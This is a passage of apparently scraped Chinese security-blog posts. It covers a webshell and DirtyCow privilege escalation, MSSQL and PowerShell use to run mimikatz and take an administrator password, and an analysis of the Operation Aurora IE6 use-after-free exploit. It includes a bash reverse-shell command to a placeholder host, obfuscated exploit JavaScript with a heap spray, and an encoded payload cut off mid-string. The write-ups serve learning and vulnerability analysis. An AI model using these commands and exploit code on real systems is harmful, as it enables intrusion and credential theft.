","date":"2019-06-12","objectID":"/2019/06/dirtycow/:1:0","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"2. webshell执行命令 首先通过已有的大马webshell执行命令，发现执行失败 \" 写个一句话木马进去，再尝试用菜刀执行命令 \" 可以看到菜刀也不能执行命令，但是菜刀返回了服务器的内核版本和系统位数，搜索了一下，应该是centos6.5，本地搭建centos6.5显示的信息也证明了这一点 \" 搜索了菜刀不能执行命令，根据资料构造了一个php文件，通过菜刀上传了上去，发现果然能执行命令，并且系统版本的确是centos6.5 \" 通过webshell查看当前权限，发现当前权限为www用户的权限，很多命令都不能执行 \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:2:0","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"3. 反弹shell 因为脏牛漏洞利用需要一个持续保持连接的shell，所以需要反弹一个shell 首先在自己的外网服务器用nc监听6666端口 \" 然后在webshell上执行反弹shell命令 \" $ bash -i \u003e\u0026 /dev/tcp/x.x.x.x/6666 0\u003e\u00261 # 其中x.x.x.x是自己nc监听的服务器地址 执行命令之后，外网服务器获得一个shell \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:3:0","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"4. 提权 有了稳定的shell之后，就可以开始尝试提权了，这里提权的exp建议在本地编译，因为目标机上www权限可能没权限执行gcc命令或者没有安装gcc 本地编译测试 \" 上传到目标机器上提权(需要上传到/tmp/目录下，因为/tmp/目录下有执行权限) \" 提权成功后，通过firefart账户登录，然后查看权限可看到是root权限 \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:4:0","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"5. END 该篇文章没啥技术含量，就是拿人家的exp上去跑了一遍就提权成功了，相当于脚本小子了，所以严格来说这只是篇经历文章。有时间应该去分析下脏牛漏洞的漏洞成因，以后再说吧。 参考链接 菜刀不能执行命令解决方法：https://www.webshell.cc/5328.html Linux下反弹SHELL的种种方式：https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html 利用脏牛漏洞详细提权过程：http://zone.secevery.com/article/846 ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:5:0","tags":["提权","渗透经历"],"title":"DirtyCow(脏牛)漏洞之实战","uri":"/2019/06/dirtycow/"},{"categories":["有趣的渗透测试"],"content":"强大的PowerShell","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["有趣的渗透测试"],"content":"1. 前言 这篇文章是把以前写在word文档中的内容搬过来了，主要内容就是记录了一次提权过程，通过MSSQL权限调用PowerShell并执行命令，最终获取了管理员的密码。虽然最后总结的流程很简单，但中间踩过的坑、遇到的问题可是不计其数(自己比较菜)，所以将此过程做了一个记录。 ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:1:0","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["有趣的渗透测试"],"content":"2. 初试提权 首先，已经得到了某个服务器的IP和MSSQL的SA账户和密码，很高兴的连上去，心想SA账户都有了，提个权还不是分分钟的事 \" 登路上去之后马上尝试调用xp_cmdshell，看管理员是否禁用了xp_cmdshell \" 虽然报了一个错误(不清楚是什么错误)，但是还好没有被禁用，而且还是system权限，看来提权触手可得，马上使用net user创建用户 \" what xxxx! 什么情况，居然没执行成功，怀疑管理员把xp_cmdshell做了什么手脚，于是去百度了许多不利用xp_cmdshell来执行命令的sql语句 \" 但是并没有什么卵用，无一例外都失败了，只能另想办法了，然后发现可以执行systeminfo命令，显示是win2008 \" Nmap扫描了一下端口，445是开启的，刚好这几天学会了ms17-010的漏洞，就打算用msf直接获取到shell，但是想象都是美好的，这服务器好像打了补丁，而且自己没有公网地址，导致反弹不回来shell \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:2:0","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["有趣的渗透测试"],"content":"3. 山穷水尽疑无路 经过上面的测试，我意识到事情并没有那么简单。这台服务器不知道做了啥手脚，CMD命令只能执行一部分没有啥危害的命令，执行创建用户这种命令就直接报错。需要换一换思路搞搞。 刚才使用Nmap扫描了一下端口，观察了一下开启的端口，其中包括很多个IIS的http端口 \" 进了一个网站看了看，发现是需要登录的 \" 从数据库里找到admin的密码，心想能不能从网站获取一个shell，进去看了之后我放弃了，全是英文，看着头疼 \" 看了一下其余的网站，全是aspx的，而且都是英文站，让我放弃了从网站入手的想法。继续翻着端口列表，突然看到一个Apache服务 \" 心里很疑惑，这个服务器不是布置的IIS吗，怎么Apache也在上面，访问一下这个端口试试 \" 卧槽，居然是wamp刚搭建好的页面，难道运气这么好，又能登录MySQL了？ \" 果然事不如愿，居然访问不了，看来还是不行啊，又回去看了看MSSQL数据库，发现dir命令可以执行，通过dir命令，发现了wamp目录下的WordPress，尝试admin登录，竟然登录进去了 \" 然后百度了一下WordPress拿shell，利用修改文件内容写进一句话木马 \" 用菜刀连接，果然能连接上了(不知道shell路径就自己本地搭建一个WordPress测试) \" 尝试用cmd创建用户试试 \" 还是一样无法创建，可能就是因为管理员把net命令给禁用了或者给更改了什么的，反正通过创建用户这一条路是不可能的了，只有直接读取Administrator的密码才行，上传getpass64.exe上去执行，显示超时 \" 然后想起是2008的系统，powershell应该能用，尝试了一下 \" 果然能用，然后就想能不能使用powershell反弹shell来获取一个权限 \" 但是好像是没公网IP的缘故，也失败了，一直收不到反弹的shell \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:3:0","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["有趣的渗透测试"],"content":"4. 柳暗花明又一村 到这里就很难受了，我感觉能利用的都利用了，能试的方法都试了，但都搞不下来。难道就要放弃了么，可近在咫尺的胜利以及花费的时间让我放弃感到很吃亏，那就继续搞呗。 经过黑无常大佬的提醒，可以利用msf调用mimikatz来读取密码 \" 但是我msf反弹不回shell啊，这个方法有个屁用啊，白高兴一场了 \" 然后一直在网上寻找其他方法，找到了可利用powershell调用mimikatz来读取密码 \" 然后尝试在本地执行，本地执行都失败了，这就很尴尬了 \" 然后又研究这个原理，终于知道了本地为什么会失败，这个powershell命令是在网上下载powershell脚本，然后再执行，失败的原因下载链接不对，所以导致失败，然后找到了GitHub上的脚本，再去本地执行，果然执行成功了 \" 然后放在菜刀里执行，然后开始几次后面执行超时，后面执行时报了如下错误，大概是因为网速太慢或者菜刀执行命令不和cmd一样，具体为什么不太清楚 \" 然后又想到了MSSQL(为什么总能想到它啊，大概是因为首先拿到权限就是因为它吧哈哈哈)，执行powershell命令试试 \" 果然可以执行，然后把刚才那段在本地执行的powershell命令带进去执行(因为有特殊字符，需要使用转义字符) \" 哇，终于成功了，用了三天时间终于拿下来了，真是不容易，这次提权就算告一段落了 \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:4:0","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["有趣的渗透测试"],"content":"5. END 这次提权算是学到了不少东西，比如MSSQL不只有xp_cmdshell可以执行系统命令，还有很多语句都能执行。还有powershell反弹shell、powershell下载脚本执行等等技术。最重要的是学到了一些道理： 不抛弃不放弃这句话不只是CF的宣言，在现实中也是很好的道理 骚思路一定要多，不能在一个地方吊死 信息 2020.05月更新： 该文章的写作时间看上去是19年，实际时间其实更早。从技术水平、写作水平上来说，的确是稍显稚嫩。但这篇文章应该是我入安全圈以来第一篇文章，所以一直保存到现在，里面很多话语不正确的地方也没有去改，当留作纪念吧，望读到该篇文章的大佬们轻喷。 ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:5:0","tags":["提权","渗透经历"],"title":"记一次利用SQL调用powershell命令获取管理员密码","uri":"/2019/06/powershell-get-passwd/"},{"categories":["二进制的奇妙之旅"],"content":"极光行动，Aurora，抛开敏感的因素外，其技术手段值得观摩，欣赏顶级黑客的较量吧。","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":" 文章链接 极光行动漏洞分析 1：提取样本 极光行动漏洞分析 2：漏洞成因分析 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:0:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"1. 前言 上一篇文章对流量包进行了分析，提取出了攻击样本，这次接着对漏洞成因进行一次详细分析。 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:1:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2. 漏洞详细分析 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.1 查看崩溃信息 首先访问提取的攻击样本，使IE崩溃： IE崩溃\" IE崩溃 从崩溃信息来看，崩溃位置在mshtml.dll模块中偏移0x68C83的位置 注意 需要注意的是，该漏洞是一个UAF漏洞，在空间被释放后，那一片区域的内存空间可以被任意使用的，而堆喷的内容有可能会被程序运行过程中给覆盖掉，所以会导致漏洞利用失败，需要多次尝试 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:1","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.2 windbg查看详情 通过windbg附加调试，可以看到是在CElement::GetDocPtr这个函数产生了崩溃： windbg调试详情\" windbg调试详情 从上图可以看到，崩溃原因是因为ECX的值为0x00000054，而从[ECX]中取值产生了访问异常，那么ECX的值是哪来的呢？ 注意 在windbg中显示符号需要符号文件支持，在这里的话，如果没有mshtml.dll文件的符号文件，是显示不出来函数名称的 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:2","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.3 windbg栈回溯 通过windbg进行栈回溯，如下： 栈回溯\" 栈回溯 从栈回溯中，可以看到调用CElement::GetDocPtr的位置是CEventObj::GenericGetElement函数和CEventObj::get_srcElement函数 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:3","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.4 ECX寻找 从后往前分析，首先分析CEventObj::GenericGetElement。将mshtml.dll拖入IDA Pro并且定位到CEventObj::GenericGetElement函数(需要符号文件支持)，找到调用CElement::GetDocPtr的位置，如下图： ECX寻找\" ECX寻找 从上图可看到，调用CElement::GetDocPtr之前，ECX的值来自EBX，而EBX又是从[ESI]所指向的内存地址中取出的值，那么ESI的值是哪来的呢？ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:4","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.5 ESI寻找 现在要寻找ESI的值是从哪来的。因为call CElement::GetDocPtr的位置上面很多地方都可以跳转过来，所以这里需要进行动态调试，我经过多次测试之后，跟踪了跳到这的路径，如下： ESI寻找\" ESI寻找 总结下来就是这样： EAX = [EBP-8] = CEventObj::GetParam函数获取的值 ESI = [EAX] ECX = EBX = [ESI] ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:5","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.6 ECX的真相 通过上面的分析，终于搞清了ECX的最终来源是[EBP-8]。但还是很懵逼，[EBP-8]里面到底是什么，需要知道CEventObj::GetParam这个函数获取了什么才行。在网上搜索到的关于这个的一些说明，如下： \" 也就是说CEventObj::GetParam这个函数是获取EVENTPARAM这个结构体的指针的，那么上面的总结应该变成这样： EAX = [EBP-8] = EVENTPARAM结构体指针 ESI = [EAX] = CTreeNode类指针 ECX = EBX = [ESI] = CImgElement类指针 用C++表示大概是这样的：ECX = EVENTPARAM.CTreeNode.CImgElement ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:6","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.7 样本执行流程 现在知道了ECX就是CImgElement类指针。而程序崩溃原因是因为ECX的值被修改成了一个错误的值，也就是说CImgElement类指针是错误的。而CImgElement类指针是保存在CTreeNode类指针所指向的内存空间中，没猜错的话这个CImgElement类指针是CTreeNode类对象的一个成员属性。类成员属性被改了，那就得分析分析为何被改了，如下： \" JavaScript不是很好，上面的分析也是通过网上资料分析的，分析的比较乱，将就着看吧。主要的执行流程就是： 通过onload事件执行了一个函数 进行堆喷射 拷贝了一个事件对象，也就是span创建出的对象 将span创建出的对象给释放了 设置了一个定时器，去执行了拷贝对象的srcElement函数 最重要的两个函数详细分析如下： function WisgEgTNEfaONekEqaMyAUALLMYW(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz) { // 执行堆喷射 gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX(); // 拷贝span对象，保存在 lTneQKOeMgwvXaqCPyQAaDDYAkd 变量中，拷贝的内容至少包括了 EVENTPARAM结构体指针 lTneQKOeMgwvXaqCPyQAaDDYAkd = document.createEventObject(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz); // 将span对象给释放掉了，也就是将span对象的CTreeNode类指针指向的内存空间释放了 document.getElementById(\"vhQYFCtoDnOzUOuxAflDSzVMIHYhjJojAOCHNZtQdlxSPFUeEthCGdRtiIY\").innerHTML = \"\"; // 设置了一个定时器 window.setInterval(nayjNuSncnxGnhZDJrEXatSDkpo, 50); } // 定时器函数 function nayjNuSncnxGnhZDJrEXatSDkpo() { p = \"\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\"; // 循环赋值，目的就是为了覆盖span对象释放后的内存空间 for (i = 0; i \u003c MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul.length; i++) { MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i].data = p; } // 执行了拷贝变量的srcElement函数，这个函数最终会调用CEventObj::get_srcElement函数、CEventObj::GetParam函数、CElement::GetDocPtr函数，最后形成崩溃 var t = lTneQKOeMgwvXaqCPyQAaDDYAkd.srcElement; } ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:7","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.8 验证猜想 上面的函数分析，我是根据网上的资料分析，并进行实验后写的。CTreeNode类指针所指向的内存空间被修改的原因是因为这个类被释放了，然后就被其他变量所覆盖了。这里验证一下，观察CTreeNode类指针修改的原因是否真的是因为类被释放了： 首先修改样本代码： \" 然后在执行CElement::GetDocPtr的位置下断点，当断在此的时候ESI就是CTreeNode类指针： \" 然后访问修改前后的样本网页，对比观察ESI指向的内存空间： 修改前： \" 修改后： \" 通过上面的测试，可以很明显的看出CTreeNode类指针的确是在被释放之后才被修改的，也就验证了上面的分析。 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:8","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.9 漏洞成因 验证了CTreeNode类指针修改的原因之后，漏洞成因也就很清楚了。通俗一点就是new 了一个对象，然后将指针复制了一份，接着释放了对象，然后使用复制的指针去获取了内容并执行，用C++代码表示就是这样： class CMyclass { public: int GetNum() { return m_Num; } private: int m_Num = 10; }; int main() { CMyclass* pObj = new CMyclass(); std::cout \u003c\u003c \"pObj.m_Num = \" \u003c\u003c pObj-\u003eGetNum() \u003c\u003c std::endl; CMyclass* p = pObj; delete pObj; // 使用已释放的指针去调用成员函数 std::cout \u003c\u003c \"p.m_Num = \" \u003c\u003c p-\u003eGetNum() \u003c\u003c std::endl; system(\"pause\"); return 0; } ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:9","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"2.10 引发漏洞的语句 引发漏洞最主要的三条语句： 引发漏洞的语句\" 引发漏洞的语句 ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:10","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"3. 漏洞利用 既然都知道漏洞成因了，就可以进行漏洞利用了。这里只针对IE6.0利用一下，其他的版本又要去考虑绕过保护机制的一些东西了。 首先将堆喷射的代码改一改： function gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX() { var mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu('%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090'); var uafwHGfWUmxkIam = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu(\"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"d\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"d\"); do { uafwHGfWUmxkIam += uafwHGfWUmxkIam } while (uafwHGfWUmxkIam.length \u003c 0xd0000); for (S = 0; S \u003c 150; S++) JsgdlqtHVnnWiFMCpdxJheQbdjITPhdkurJqwIMuMxJnHf[S] = uafwHGfWUmxkIam + mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO; } 接着在调用CElement::GetDocPtr的位置下条件断点：ECX==0x0C0D0C0D \" 接着重新运行IE，然后访问修改后的样本文件，断下来时ECX已经为0x0C0D0C0D： \" 跟到CElement::GetDocPtr去执行，可看到EAX被赋值为0x0D0C0D0C，而执行的位置为0x0C0D0C0D： \" 然后跟进去执行，Ctrl+B搜索90909090，然后下断，运行，可以看到程序顺利的执行到填充的90909090的位置： \" ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:3:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"4. END 这次漏洞分析就到这里结束了，从最开始的流量分析、提取出样本，再到后面的漏洞成因分析，最后到漏洞的利用，这一套流程算是完整的走了一遍，收获蛮大的。真的感觉发现这个漏洞的大佬是真的吊，就是不知道通过啥方式找到的这种漏洞，这是一个坎啊。这次还是很感谢搞出这个流量题的 @老刘，还有帮助了我很多的 @梦轩老哥。 由于这是我第一次接触UAF漏洞，以及第一次从漏洞的一无所知到最终完成分析的过程，其中难免会有分析错误的地方。如果大佬们发现有什么不对的地方，望斧正！ 问题 其实还有几个点有疑惑，等有时间再一一分析： 样本代码中有两处类似于堆喷的地方，为啥会有多个？ 事件对象详细的执行流程 如何修复与防范 参考链接 看雪大佬的分析：https://bbs.pediy.com/thread-105899-1.htm 梦轩老哥的分析：https://bbs.pediy.com/thread-251672.htm Ox9A82大佬的分析：https://www.cnblogs.com/Ox9A82/p/5837769.html ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:4:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-漏洞成因分析","uri":"/2019/06/aurora-analysis-2/"},{"categories":["二进制的奇妙之旅"],"content":"极光行动，Aurora，抛开敏感的因素外，其技术手段值得观摩，欣赏顶级黑客的较量吧。","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":" 文章链接 极光行动漏洞分析 1：提取样本 极光行动漏洞分析 2：漏洞成因分析 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:0:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"1. 极光行动介绍 来自百度百科 极光行动（Operation Aurora）或欧若拉行动是2009年12月中旬可能源自中国的一场网络攻击，其名称“Aurora”（意为极光、欧若拉）来自攻击者电脑上恶意文件所在路径的一部分。遭受攻击的除了Google外，还有20多家公司：其中包括Adobe Systems、Juniper Networks、Rackspace、雅虎、赛门铁克、诺斯洛普·格鲁门和陶氏化工。这场攻击过后，Google提出了它的新计划：它将“在必要的法律范围内”，于中国运营一个完全不受过滤的搜索引擎；同时Google也承认，如果该计划不可实现，它将可能离开中国并关闭它在中国的办事处。 此漏洞是基于 IE6.0 的一个经典漏洞。可能因为某些原因，这个漏洞的分析报告出奇的少，能搜索到的绝大多数是如何利用的 PoC，抱着对漏洞成因的好奇，于是对该漏洞来了一次详细分析。 其实这个漏洞开始我是不知道的，是因为 @老刘 发来一个流量包，而这个流量包里就是受害者用 IE6.0 访问攻击者恶意构造的网站后，触发此漏洞的一个场景。所以最开始对此漏洞是一无所知的，这里我是将从拿到流量包并分析、提权样本、分析漏洞成因、利用此漏洞这几个步骤一一记录下来，算是对整套分析流程做个记录。 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:1:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2. 流量包分析 既然只有流量包，那就只能从流量包入手。在这里需要提醒一句的是，因为这个流量包是有人故意做的一个流量包，所以这个流量包是比较干净的，也就是里面就只有与这个漏洞相关的流量，相对来说分析起来较为容易。如果是在真实环境中，抓取到数据包可能是杂乱无章的，这样的情况就很考验流量分析的技术了。我们这里是为了分析漏洞，所以只对流量做简单分析即可。 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2.1 流量的大概内容 打开流量包之后，可以看到这个包中只有HTTP和TCP两种类型的数据包 。 流量大概内容\" 流量大概内容 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:1","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2.2 查看协议分级 从协议分级中可以查看到，TCP和HTTP协议占用了大部分的数据包 协议分级\" 协议分级 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:2","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2.3 查看对话 从对话窗口可以看出只有两个会话 查看对话\" 查看对话 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:3","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2.4 过滤对话 在对话窗口设置过滤器 设置过滤器\" 设置过滤器 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:4","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"2.5 追踪流 在过滤后的流量中，选择追踪流，可以将当前流量显示成可直观观察的流量。但需要注意一点的是：需要根据当前过滤的数据包协议来选择追踪哪个流，例如我这里过滤的TCP的协议，那么追踪时就追踪TCP流。假如过滤是其他协议，例如HTTP协议，就需要选择追踪HTTP流 追踪TCP流\" 追踪TCP流 过滤的流量中有两个完整的流，分别如下： 流0： 追踪流0\" 追踪流0 流1： 追踪流1\" 追踪流1 可以看到流0是一个访问Web的对话，流1则看上去像是Windows命令行中执行了命令 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:5","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"3. 提取样本 通过上面两个流的内容来看，可以猜测是受害者访问了攻击者的网页，然后攻击者的网页执行了Windows命令(对攻击比较敏感的话一眼就能看出来了)。接下来就需要提取出攻击者的攻击样本，然后对此样本进行分析。 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:0","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"3.1 对流0进行分析 对流0的流量进行分析，可以看到很明显只有一个网页访问，该网页可能就是攻击者的恶意页面 对流0的分析\" 对流0的分析 ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:1","tags":["漏洞分析"],"title":"极光行动漏洞分析-提取样本","uri":"/2019/06/aurora-analysis-1/"},{"categories":["二进制的奇妙之旅"],"content":"3.2 提取样本 提取样本\" 提取样本 最终提取出的网页内容是这样的： \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"\u003e \u003chtml\u003e \u003chead\u003e \u003cscript\u003e var IwpVuiFqihVySoJStwXmT = '04271477133b000b1a0c240339133c120e2805160e1503684d705005291a08091b3e6e713e1122520b03123d051808392c0d27123b0a0805033c1c0735321a2407350314142935250829083c0a0000072f142624011f2a27022825082f253f2c39394a716a2615275207142524357d43772c2702705a2f466a657c6e4a256a7450614176566c65257e4165310515150a0f2b35302a103d0e03041e0234362f3a3c34073e1b0d0d02131e3f1635200e21101c38093913112e322223211f3239302133381b330a0c2c1175576c2e2713251f2308236b2f270f2d3e2d353c172b03393164031d192b1e363c012f072d311538230f2e113979490b03123d051808392c0d27123b0a0805033c1c0735321a2407350314142935250829083c0a0000072f142624011f2a27022825082f253f2c39393125176614310627466a656e0d3a3968730d261334463b1122303b07052d3d3705303e36340f05131d0b2934142b070d33657175043926244b261334461d362b31063d3e00263e1c110f11080f250e340020150110220c1e111c3d0e273f3a3a21050f2b2208341f04042c684d701c231177043e270b3562614b26133446220e083e1c0d0e1b3d1d31362b271221170036001a240230092e222638383d152b1a23162b0d3330230b14053e3e3c1a321537122d27043a30271d2439383b121f160a033e1c211e383f203e3e143136190210081f2c1e231603112d363975576c3f261523112716327e2a20042f3e211f3e5221212e233d131c0f1318223d2a24080212361718392626070a24072c27102533210823092a15390917190d3e3310250d0c04053d04173d1c0f212b180820333c382d3e3d2036000921320a1c36371e4e7e3e3a34186c271f1707352e1f260a1a2d281c3b3c1e113411272e3d2419043d080611023c280d1c3318332b3b1c3d061f0b050810103b173a160f32230a060d16260216001c1c05684d70070d223c330d113901070b001d02110b152f361f3818180a3f180725123a121534381f0c113b05152021162a3e211e26282f012408242e381f27020605220124293309293c3321011a033a040822143533003f08000e22392c35270835137f656b701f2a727c4175077f5565726920537b782e55254b7f52366039610b75286d05364b7255723078305e2e6f3d49624b76432223746108693f7b47694063136423756c4f392c7d49695733526f7c7d701f75287b167507725f632369205e29797f5525417152616039315c78786d05644a720